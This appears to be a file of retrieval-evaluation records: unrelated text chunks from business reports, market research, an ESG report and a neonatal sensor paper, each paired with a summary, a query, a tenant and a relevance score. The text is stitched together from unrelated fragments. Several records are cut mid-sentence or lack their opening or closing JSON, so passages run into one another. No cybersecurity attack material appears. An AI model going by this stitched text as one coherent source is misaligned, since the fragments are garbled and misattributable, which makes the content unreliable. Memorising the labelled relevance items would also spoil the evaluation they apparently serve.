with the likely decline in revenues or will\nface fiercer competition within the supplier market.

As governments face mounting\nanxiety from their constituents and look to protect\ntheir economies from geopolitical risks, they have\nraised antitrust measures and custom duties on\nstrategic technology. Deglobalization is expected to\nmake labor more expensive and supply chains less\nefficient. AI and automation can remove costs from\nhow banks-and corporations at large-serve their\nclients. A confluence of stresses demands continued\nresilience and investment in security.\n\nMilitary escalation. The war in Ukraine may continue\nfor an extended period. Even if a resolution is found\nin the near term, the European energy agenda will\nbe largely at the mercy of suppliers and scarce\nresources, forced to accept prevailing prices for\nthe time being.\n\nAs a result, the prices of goods and services will likely\nincrease, impacting the economic competitiveness\nof the whole continent and beyond. Sovereignty and\nsupply chain resilience concerns warrant a new\nsecured approach to manage cloud and on-premises\nenvironments.\n\nEconomic rivalry. The two largest global economic\npowers-the US and China-could continue to\ncompete for dominance on a range of topics from\nmanufacturing industrial components to deploying\nartificial intelligence at scale and transforming money\nsupply with central bank digital currencies (CBDCs).\nThe shift from collaboration to open competition has\nbeen recognized worldwide and is causing the\ndelicate repositioning of established strategies.\n\nRegulators are responding to geopolitical risk in a\nvariety of ways, from scrutinizing the sovereignty of\ncloud to demanding higher protection of citizens' data\nand privacy. Banks' 2023 profitability will be further\nconstrained due to the growing cost of geopolitical\ninstability; they may have to reconsider investments\nbecause of it.\n\nNew competitors bring\n\nnew challenges\n\nNon-traditional competitors are challenging\nincumbent institutions, wooing clients with a better\nclient experience at a lower cost. These new\ncompetitors are a mix of fintech startups and\n\"techfin\" companies (technology companies that\nhave entered the financial arena). This heightened\ncompetition is accelerating the contraction\n\nof financial services margins, steering new revenue\nopportunities away from established institutions.\n\nNew competitors have taken advantage of a key\nchange brought by the pandemic: clients are more\naccustomed to consuming financial services on\ndigital.

They are navigating technology,\nbusiness, and people issues, hampered by legacy\narchitectures and operating models.

S7 to S9). Even with 20% stretching, the changes in the inductance, Q factor, and resonant\nfrequency of the antennas are minimal (< 5%) (figs. S10 and S11).\n\nFigure 1D shows pictures of a PPG EES with its red LED activated, captured with and without external\nillumination. Images in Fig. 1, E and F, compare clinical standard technologies to our devices, as\ndeployed on a realistic model of a neonate. Existing systems require a collection of separate electrodes,\nsensors, and limb-strapped systems paired to base units with hard-wired connections.\n\nAn ECG requires three adhesive-backed electrodes with adjoining wires to monitor HR, HRV, and RR.\nCommonly used electrodes for this purpose (e.g., Red Dot, 3M Company) may require additional\nadhesives that further increase the risk of skin injury. Measurements of SpO2 rely on limb-based devices\nfor PPG (e.g., LNCS Neo SpO2 sensor, Masimo), typically wrapped around the entire foot, with an\nadditional wired interface.\n\nContinuous measurements of skin temperature, necessary to monitor for signs of hypothermia, involve\nanother adhesive-backed sensor (e.g., HNICU-22, DeRoyal) and adjoining wire. Collectively, then, vital\nsigns monitoring in the conventional manner requires at least four electrodes and one limb-deployed\ndevice, with five wires for external connection to yield HR, HRV, RR, skin temperature, and SpO2.\n\nThe block diagram in Fig. 1G summarizes the system architecture and overall wireless operation of our\nsystems. The ECG EES includes two epidermal electrodes, an instrumentation amplifier, analog filters, an\ninverting amplifier, and a NFC system-on-a-chip (SoC) (fig. S12).\n\nThe PPG EES includes a pair of small-scale LEDs that emit in the red (640 nm) and infrared (IR) (940 nm),\na photodiode, LED drivers, an external power circuit, analog filters, an inverting amplifier, and aNFC SoC\n(fig. S13). A 14-bit analog-to-digital converter (ADC) operating at a sampling frequency of 200 Hz\ndigitizes the signals captured by each module. The RF loop antennas in both the ECG EES and PPG EES\nserve dual purposes in power transfer and in data communication.\n\nThe standard NFC protocol at 13.56 MHz supports only low-speed, low-fidelity applications such as\ncontactless payments and wireless identification (15); thus, substantial modification in both the\ntransponder and host reader systems at ISO15693 was required to support data transfer rates sufficient\nfor NICU monitoring (hundreds of Hz). The results enable continuous streaming of data at rates of up to\n800 bytes\/s with dual channels, which is orders of magnitude larger than those previously achieved in\nNFC sensors (15\u201317).\n\nA key to realizing such high rates is in minimizing the overhead associated with transfer by packaging\ndata into six blocks (24 bytes) in a circular buffer. Reading occurs with a NFC host interfaced to a\nmicrocontroller in a Bluetooth Low Energy (BLE) system configured with the customized circular buffer\ndecoding routine (fig. S14).

{"text":"Global Open RAN Adoption\n\nMost of the CAPEX required to build a wireless network is related to the RAN segment, reaching\nas high as 80% of the total network cost. Any reduction in the RAN equipment cost will significantly\nhelp the bottom line of wireless operators as they struggle to cope with the challenges of ever-increasing mobile traffic, flat revenues and rising costs to maintain their networks.\n\nTwo of the biggest challenges that networks face today is the cost to deploy and maintain\nnetworks due to vendor lock-in and network complexity as networks need to support 2G, 3G, 4G\nand eventually get ready for 5G. These challenges become especially apparent in low ARPU\nmarkets, rural areas, or developing markets like Latin America, APAC or Africa. That is why we\nsee Open RAN adoption happening faster in those regions, as Open RAN innovation gives those\noperators the ability to choose any RAN vendor thus reducing the deployment cost in those\nchallenging deployment areas.\n\nOpen RAN first was deployed in rural areas. Why you might ask? Not only because it was an area\nwhere operators could test new and yet unproven technologies, but also from an investment and\nmaintenance standpoint, rural areas are the most challenging ones. If a solution is low-cost\nenough for rural markets and can economically support the very limited number of users, it will\nhave even better TCO in urban markets. If rural sites can be upgraded remotely with a software\npush to the edge, maintenance cost will be reduced as well and will make any urban deployments\neasy to upgrade as well.\n\nRural Open RAN no more in the recent investor briefing, Vodafone CEO Nick Read spoke about\nOpen RAN getting ready for urban. \"We think we'll have a rural open RAN ready for 2021 and we\nare looking to an urban, which is a more complex execution, in 2022, but we need government\nand we need operators to scale this to improve functionality and efficiency going forward,\" he\nsaid. This statement highlights the importance of the \"village,\" or an ecosystem that has been\nestablishing itself for the last few years: from MNOs, vendors, hardware and software, to system\nintegrators, governments and regulators, in every region of the world: from emerging markets all\nthe way to developed markets like Europe and the US.\n\nThe main takeaway: after many years of proving 2G 3G 4G Open RAN in rural areas, leading\nOpen RAN innovators like Vodafone are ready to take Open RAN to urban locations.\n\nEmerging and Developed Economies\n\nIt is important to emphasize here that 2G and 3G networks are not going away anytime soon.\nSome countries are switching off 2G, some are switching off 3G, but the majority of the world will\nstill have a combination of 2G, 3G, 4G, and 5G networks for years to come. The GSMA mobile\neconomy report 2020 mentioned that 5% of the global population will still use 2G in 2025. That\nstill amounts to over 360 million users. 4G will still dominate technology in 2025 as well.\n\nIn emerging economies, specifically across Africa, parts of Europe and Latin America, many\noperators still utilize substantial 2G and 3G investments. The migration from legacy to 4G and 5G\nnetworks will be key challenge in those regions since the telecom industries there are still\nemerging, and an implementation of 4G and 5G could prove very costly because it will require\nrunning old legacy non-IP networks and new all IP (4G and 5G) at the same time. In many of the\nregions across Africa and Latin America, the replacement rate of cellular devices is much lower\nthan in other regions of the world. As mobile phones that are compliant with legacy 2G and 3G\ntend to be used more in emerging regions, the operators require a solution that can support both\n2G and 3G solutions while simultaneously preparing for the deployment of faster 4G and 5G\nnetworks. Open RAN solutions that support 2G, 3G, 4G and 5G will cost-effectively enable\nconnectivity in those markets by simplifying installation and providing technological flexibility and\nsustainability.\n\nin\n\nwww.parallelwireless.com\n\nParallel 55\n\nWIRELESS\n","summary":" Summary of everything you need to know about open RAN, including the technology, its components, and its components and functional splits, in parallel with the TIP and O-RAN Alliance groups","query":"What are the challenges of Open RAN globally?","tenant":"Telecom","assessment":"yes","score":1.0}

{"text":"Simplifying Adhesive Decisions\nfor Your Application\n\nThe following questions will help you narrow adhesive choices\nto a few possibilities for evaluation.\n\nQ: What materials\n\nwill be bonded?\n\nA: Structural adhesives work\nby adhering to the top surface\nof the bonded parts, so it's\nimportant to know the exact\nmaterial and condition on\nthose surfaces. For metals,\nwill the adhesive be applied\n\nto bare metal, or will there be a paint or coating on the\nsurface? For plastics, exactly which base resin? Could there\nbe residual release agents on the surfaces used for\nmold release?\n\nQ: What is the preferred\n\ncure speed?\n\nA: The chosen structural\nadhesive must have enough\nwork life (open time, pot life)\nto allow proper mixing and\napplication of the adhesive\nand assembling of the bonded\n\nparts. Smaller assemblies or\n\nshorter cycle time production processes may be able to use\na faster curing adhesive with a work life of only five minutes\nor less, while larger assemblies that require alignment and\nclamping will probably need a work life of 20 minutes or more.\n\nQ: What surface\npreparation will\nbe required?\n\nA: Structural adhesives\ngenerally prefer clean, rough,\ndry surfaces for highest\nbond strength. This typically\nmeans either light abrasion\nand solvent cleaning of the\n\nsurface, or solvent cleaning followed by chemical etching\nor applying a primer. Adhesion tests should be performed\nto determine the adequate surface preparation for a\nspecific application.\n\nQ: What types of\n\njoints are best for\nstructural adhesives?\nA: Joint designs that put the\nadhesive bond under shear,\ntension, or compression\nforces will provide the highest\nstrength. Designs that tend\nto apply peel or cleavage\n\nforces to the adhesive, where the applied stresses are not\ndistributed over the entire bond area, will have lower bond\nstrength, but the bond may still be sufficient for the needs\nof the application. In addition, optimum bond line thickness\ntypically ranges from 0.005\" to 0.020\". The adhesive\n\nqualification process should always include testing of\nprototype assemblies to ensure the adhesive will provide\nenough performance.\n\nQ: How are structural\n\nadhesives used\n\nand applied?\n\nA: Structural adhesives come\n\nin many forms, including low\n\nviscosity liquids and non-sag\n\npastes, one- and two-component\nformulations, short and long\n\nwork lives, and various package\nsizes and shapes. Most two-part structural adhesives\nare available in both bulk containers and convenient,\n\neasy-to-use cartridge mixing systems.\n\nQ: What are the general\ncharacteristics of\n\nthe different types of\nstructural adhesives?

{"text":"Environmental, Social and Governance Risks\n\nPrudential believes that it has a moral and business imperative to\nunderstand and manage its ESG risks. To consider the Company's physical\nand social environment is not only the right thing to do, but it is expected\nby employees, customers, investors, regulators, and rating agencies.\n\nAs the speed and pace of change on these issues have increased, so have\nthe expectations of our keholders. Companies are not only expected to\ndo the right thing, but insufficient action on these issues can have negative\nfinancial implications. For these reasons, we are working to augment\nthe risk management framework by incorporating the consideration of\nESG risks and opportunities. As we look to the future, ESG risks bring\na high degree of uncertainty in the form of potentially severe disruption\nto environmental, financial, and social ecosystems which may create\nrapid and sudden outcomes for stakeholders. Therefore, we work hard to\nunderstand how these developments may impact the business models of\nthe companies in which we invest and the Prudential business model itself.\n\nEnvironmental Risks\n\nHistorically, we consider environmental risks-especially climate-related\nrisks and their impacts on cash flow and the valuation of our investments.\nLooking to the future, we must analyze a broader distribution of outcomes\nto account for the potential for increasingly severe climate disruptions.\nThe potential disruptions from climate change pose investment risks by\nexposing our investment holdings to both physical damage from climate\nchange (physical risks) or substantive changes in business models\namidst the shift to a lower-carbon economy that could result in financial\ndeterioration or stranded assets (transition risks). These impacts could\nuniquely affect specific companies, sectors, asset classes, and geographies\nin which we choose to invest. Climate change also poses market and\nliquidity risks from sudden changes in the pricing or liquidity of assets that\nPrudential holds. Climate change may also affect population health and\nmortality by triggering events including heat stress, floods, wildfires and air\npollution, and the spread of disease.\n\nHome\n\nIntroduction\n\nGovernance\n\nSustainable Investing\n\nAdditionally, we evaluate operational risk exposure to physical assets and\noperations in geographies with rising sea levels and more severe weather\nand flooding. We also study the potential impacts of disease to help\nconsider all operational outcomes.\n\nIn January 2021, a senior-level Climate Change Steering Council and\nsupporting Task Force were established to develop, execute and oversee\nthe Company's climate change strategy. In addition, the Task Force, which\nincludes representatives from all relevant internal groups, including ERM,\nworks to coordinate climate-related activities across the Company. ERM is\ndeveloping its approach to climate challenges by devoting increasing time\nand resources to climate-related risk, which will enable the organization to\nbetter understand the implications of a broad set of climate risk outcomes.\n\nSocial Risks\n\nSocietal challenges could be exacerbated if there are declines in the\nhealth of the environmental and financial ecosystems. As pressures build\naround these ecosystems, having a fair society where all participants feel\nthey have a vested and equal interest in societal outcomes is critical. With\nrising inequality, there is not only increased risk to society but an inability to\nsolve long-standing challenges. It is, therefore, crucial for the sustainability\nof our society that we continue to work towards inclusion and racial\nequity. Prudential has made nine racial equity commitments, which span\ntalent practices, design and delivery of products, investments and public\npolicy work, and support of community institutions working to remove\npersistent obstacles to Black economic empowerment. In addition, given\nthe challenges discussed above, having a diverse talent pool that reflects\nour society is a critical component to finding solutions to the problems\nfacing us. Beyond these initiatives, Prudential considers social factors in\nthe assessment of investment risks as part of its strategic review process,\nfocusing on how social inequality could impact various sectors, such\nas healthcare. For more information regarding Prudential's racial equity\ncommitments, please refer to Attracting and Retaining the Best People\nsection of this report.\n\nPeople\n\nCommunity\n\nEnvironment\n\nAbout this Report\n\nAppendix\n\nPrudential 2021 ESG Report\n\nThe use of artificial intelligence (AI) within the financial services industry\nhas led to societal concerns around potential unintentional discrimination\nor bias against protected classes. Prudential has adopted Ethical Principles\nfor Al, which provide the foundation for trust and transparency in our use\nof Al and include a commitment to avoiding the creation or reinforcement\nof unfair biases, unintended consequences, and unlawful discrimination.\n\nGovernance Risks\n\nOur corporate governance has always been about promoting the stability of\nlong-term outcomes where risks and financial outcomes unfold over decades.\nPrudential is as committed as ever to effective, consistent, and transparent\ncorporate governance. This becomes more important during times of stress\nand evolution, including the potential disruption that could result from\nfuture ESG issues. Prudential's risk management framework supports this\nobjective with formal processes and governance systems that facilitate open\ncommunication and effective challenge, thereby promoting the consideration\nof diverse views and constructive engagement.\n","summary":"2021 ESG Report from Prudential Financial, Inc., providing an overview of long-term Company goals and efforts in support of those goals.","query":"What is prudential financials approach to sustainability?","tenant":"Finance","assessment":"yes","score":1.0}

{"text":"Leaders will be expected to adapt and respond\nto four key market conditions:\n\n1. Macroeconomic tensions.\n\nIncreasing macroeconomic tensions are epitomized\nby spiking inflation, which called for major central\nbanks to raise interest rates (except in China and\nJapan).\u00b9 Facing recessionary environmen the\nsudden reversal in monetary policies may prove\nuntenable for central bankers, adding more\nuncertainty in future decisions. At the same time,\nprice volatility has returned to financial markets.\n\n2. Geopolitical uncertainties.\n\nEconomic decoupling, among other factors, is\ntesting the resilience of value chains while\nheightening financial risk across geographies and\neconomic sectors. As globalization helped reduce\ncosts, deglobalization will drive up costs, further\nfuel inflation, and change financial clients' needs.\n\n3. New competitors.\n\nClients' digital adoption is accelerating, which\nexposes the shortcomings of traditional financial\nservices. This creates an opening for new, digital-savvy competitors to capture and engage clients,\nresulting in potential revenue loss for incumbents.\nLarge traditional institutions are hindered by legacy\nbusiness and operating models that are not proving\nagile enough. Many of these models were designed in\nanother era for another era, long before the speed\nenabled by exponential technologies.\n\n4. Sustainability.\n\nEnvironmental concerns have led to new, albeit\nnecessary, restrictions on business and economic\nactivities. While banks can be an integral part of\nthe sustainability solution and find new revenue\nopportunities, they are also exposed to new risks\nand complex compliance requirements.

The US\nFederal Reserve Board was first to act, raising\ninterest rates, certainly aware of the potential\ndrawbacks in an economy with stagnant real GDP.\nThe European Central Bank followed, despite the\nrecessionary effects of energy supply challenges\ncaused by the war in Ukraine. On the other end of the\nspectrum, the People's Bank of China further reduced\nrates as part of an effort to stabilize the ailing housing\nmarket while they shift from a manufacturing-led\nboom to a more services-oriented economy.\n\n7\n","summary":" Global outlook for banking and financial markets from the IBM Institute for Business Value in 2023","query":"What are the key challenges in financial service industry?","tenant":"Finance","assessment":"yes","score":1.0}

Therefore, whilst we do not expect growth\nto continue at the same scale as in 2021 and 2022, we project the market will grow again in 2023 and in the remaining years of the forecast.\n\nThe time taken to convert orders to revenues is shorter for ultrasound compared to other imaging modalities. Therefore, with the supply chain issues in\n2022, multimodality vendors prioritized their ultrasound business, to avoid losing out on the quick revenue returns their ultrasound business offers.\nWhilst the component supply chain issues seen in 2021 and 2022 have been mostly resolved, further system price increases are expected in 2023 due to\nincreased logistical costs. However, Brazilian customers now have more choice due to the increased presence of Chinese vendors, so it will be difficult to\njustify further price rises.\n\nThere was very large growth in the Mexican market in 2022. Similar to Brazil, the growth was driven by centralized government purchasing. There was\npurchasing from multiple government bodies such as the Social Security Institute. However, the Instituto de Salud para el Bienestar (InSABI), who\nprovide medical services to people who are not covered by the Mexican Social Security Institute or the Institute for Social Security and Services for State\nWorkers, was responsible for most of the purchasing.\n\nThe private market, following the government spending, was also active in 2022 with purchasing mainly in the mid-range\/low-end segments.\n\nInSABI is expected to continue purchasing in 2023 and with an election in 2024, we expect more government spending. As a result, we forecast another\nyear of strong growth in the Mexican market in 2023.\n\n\u2022 There is a mandatory trade agreement in Mexico for vendors to enter public tenders. Whilst this does not include vendors from China and India, as these\ncountries do not have a free trade agreement with Mexico, it is still possible for vendors from these countries to enter public tenders. Mindray, for\nexample, has a factory in the US and so can use this as a means to participate in public tenders.\n\nSignify\n\nRESEARCH\n\nThe Rest of Americas region began recovering from the COVID-19 pandemic from the second half of 2021 to the first half of 2022. The market slowed\ndown in the second half of 2022, as government purchasing and tenders were notably reduced, leading to a small estimated market decline in 2022.\nThe outlook for the Rest of Americas ultrasound market varies depending on the country, with those that declined one year seeing strong growth the\nnext and vice versa. Peru and Chile are projected to be growth markets in 2023.\n\nIn some countries, such as Argentina, customers want to have the best technology for a low price. There is a new trend emerging, primarily in women's\nhealth, where customers are now starting to purchase lower priced systems, and the product mix is shifting towards the mid-range segment. Where\ncustomers would usually purchase refurbished premium\/high-end systems, they now prefer to by new, cheaper mid-range systems, often from other\nvendors.\n","summary":"market research report published by Signify Research in July 2023, covering the world market for ultrasound equipment.","query":"What do we know about the ultrasound market in Latam?","tenant":"Philips","assessment":"yes","score":1.0}

Based on data from the CIA, IMF, U.S. Census Bureau, and WHO.\n\nHealth Care System\n\nPATIENT MONITORING DEVICES MARKET INSIGHTS\n\n$623\n\nTurkey employs a mixed public health care system combining a centralized state system run by the Ministry of Health and a growing\nprivate sector in which care is superior but costs are largely funded out-of-pocket. The Turkish health care system has seen\nsignificant reform in recent years as Turkey has attempted to strengthen its petition for inclusion in the EU. In order to bring its\nhealth care system closer to European standards, Turkey began to implement the HTP in concert with the World Bank in 2003. A\nmajor tenet of this program was the creation of a universal health insurance system. As such, in 2006, the Turkish government\ncombined the country's various social security schemes into a General Health Insurance Scheme under the national SGK, smoothing\nthe disparities in coverage between population groups that prevailed under the previous system (Ministry of Health (Turkey), 2010).\nThis reorganization was designed with universal coverage in mind and funding provided through income-tested premiums. Coverage\nhas indeed expanded in Turkey: prior to 2003, less than 65% of the population was covered by some form of health insurance; by\n2009, this number had reached nearly 90% (World Bank, 2010).\n\nAs part of the HTP, Turkey saw an increase in the number of health care facilities and sea and air transportation vehicles were added\nto the system (Ministry of Health (Turkey), 2010). Investment in the construction and renovation of health facilities across the\ncountry is expected to raise standards of care. Since 2003, nearly 2,000 new health care facilities (including more than 500\nindependent hospitals and new hospitals buildings) have been introduced, and the number of health care personnel has grown by\nroughly 190,000, resulting in an overall workforce of 447,000 (Akda\u011f R, 2011). There are approximately 1,400 hospitals in Turkey,\n60% of which are publicly operated, and a ratio of 14 physicians per 10,000 individuals (Organisation for Economic Co-Operation and\nDevelopment, 2013)(World Health Organization, 2011) (Ministry of Health (Turkey), 2010). Increased investment in health\ninfrastructure is expected to increase the number of facilities in the country in coming years, and the total number of physicians is\nanticipated to climb from 120,000 in 2010 to 200,000 in 2023 (Akda\u011f R, 2011). Increased autonomy for health providers is also being\npursued as a means of improving the quality of care provided in the system (World Bank, 2010). In addition, a broadening of \"Green\nCard\" coverage for low-income groups has been implemented, including the incorporation of outpatient care (World Bank, 2010).\nOverall, the percent of GDP spent on health in Turkey stood at approximately 6.7% in 2009 (Central Intelligence Agency, 2012); the\nTurkish government has stated its intention to increase this expenditure to 8% by 2023 (Akda\u011f R, 2011). Government plans also\ninclude increasing per capita health expenditures to approximately $1,000 by 2015 and $2,000 by 2023 (Akda\u011f R, 2011).\n\nDespite ongoing reforms, health care services are often inadequate in Turkey, particularly in rural areas, which are home to\napproximately 30% of the population (Central Intelligence Agency, 2012). Moreover, despite increased health coverage, the quality\nof public health services is sufficiently low to encourage use of private health providers. Because only approximately 2% of the\npopulation has private health insurance, however, this results in significant out-of-pocket expenditures (World Health Organization,\n","summary":"market research report published by Clarivate in July 2019, providing country overviews of patient monitoring devices, including market insights, market forecasts, and market data.","query":"turkey healthcare spend in 2023","tenant":"Philips","assessment":"yes","score":0.9999969487}

They are less inclined\nto take environmental action themselves, nor expect it from\nanyone else, including government or companies.

As\nsuch, they are less inclined to take individual action to reduce\ntheir impact on the environment.\n\nShifting dimensions\n\nBusy Bystanders\n\nFrom understanding to activation\n\nDisengaged Denialists\n\nThis segment would clearly be the most difficult to crack for any\nmarketer or policy maker. But all is not lost. It will be important\nto find areas of common ground and to build from there. A key\nto having the conversation is to avoid value-laden judgemental\ndiscussion (whose values are 'better') and focus instead on the\noutcomes - what are the implications of not acting that can be\nagreed on? Then from here find ways to mitigate them.\n\nIt is important to be respectful of this segment, as their position\nmay be driven by lower awareness of the global situation and\nthat they are more inward looking, having more immediate and\npressing needs. But when the realities of environmental and social\nissues come to the fore, they have the potential to be strong\nallies. They need to be brought into the conversation 'locally'\nafter better understanding their sensitivities. There is also an\nimportant signalling act here for the wider population of the\nimportance of accepting a diversity of viewpoints.\n","summary":" November 2022 segmentation study of environmental sustainability, focusing on the beliefs, values and attitudes of citizens across 15 markets","query":"what are the main drivers of our detractors","tenant":"Telenet","assessment":"no","score":0.0004305574}

{"text":"IPOL | Policy Department for Economic, Scientific and Quality of Life Policies\n\na. The new strategy of OEMs for 2020\/2021 and beyond\n\nAll European carmakers are set to increase widely the offer of EVs in the coming years, with the\nVolkswagen (VW) group leading the way (see Figure 2.1 below). This change in strategy is also\nreflected in the long-term goals of the industry, with almost all OEMs public committing to ambitious\nelectrification goals until 2030. According to the International Energy Agency 4\u00b3, VW, Daimler, Volvo,\nand Stellantis have all committed to increasing the participation of EVs in car sales to at least 50% by\n2030, while Renault and BMW have announced different, although not necessarily less ambitious,\ngoals. All large OEMs have committed to significant investment in EVs in the coming years.\n\nFigure 2.1: Number of EVs (PHEVs and BEVs) models launched and planned until 2025 by OEM\ngroup in Europe.\n\n300\n\n250\n\n200\n\n150\n\n49\n\n100\n\n50\n\n0\n\nVolkswagen PSA-Stellantis* FCA-Stellantis*\nGroup\n\nDaimler\n\nBMW\n\nRNM\n\n* PSA and FCA completed a merger in 2021 to form the Stellantis conglomerate.\nSource: Transport & Environment (2019).\n\nJaguar-Tata Volvo-Geely Total European\n\nOEMs\n\n2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025\n\nPE 695.457\n\nThis movement has translated into an explosion in the offer of EVs in the European market in\n2020, with many more models expected for 2021 and beyond. Figure 0.1 shows the planned offer\nof BEVs and PHEVs in Europe until 2025, compiled by Transport & Environment in 20194\u2079. It shows that\n2020 and 2021, the years the new mandatory emission limits kick in, represent a breakpoint in the\ngrowth speed of EVs in Europe, with a noticeable jump in the number of available EVs. European brands\nappear well-positioned relative to non-European OEMs and account for a wide majority of the models\navailable in Europe. Renault-Nissan-Mitsubishi (RNM), Volvo and Jaguar are treated here as European\nOEMs due to their strong production and R&D footprint in Europe, although the latter two are\ncontrolled by the Chinese group Geely and the Indian conglomerate Tata, respectively.\n\nTotal Non\nEuropean OEMs\n\nAs cited in the Introduction to this section, the consequent market shift towards EVs in the\nEuropean market has been monumental. This movement was greatly facilitated by the enabling of\nstronger subsidies for EVs in the context of green recovery packages during the Covid-19 crisis, notably\nin Germany, France and Italy 50. In 2020, Europe, as stated, surpassed China as both the biggest market\nfor EVs in the world and the biggest share of EVs in total car sales.\n\n48 IEA, 2021, Global EV Outlook 2021 - Accelerating ambitions despite the pandemic.
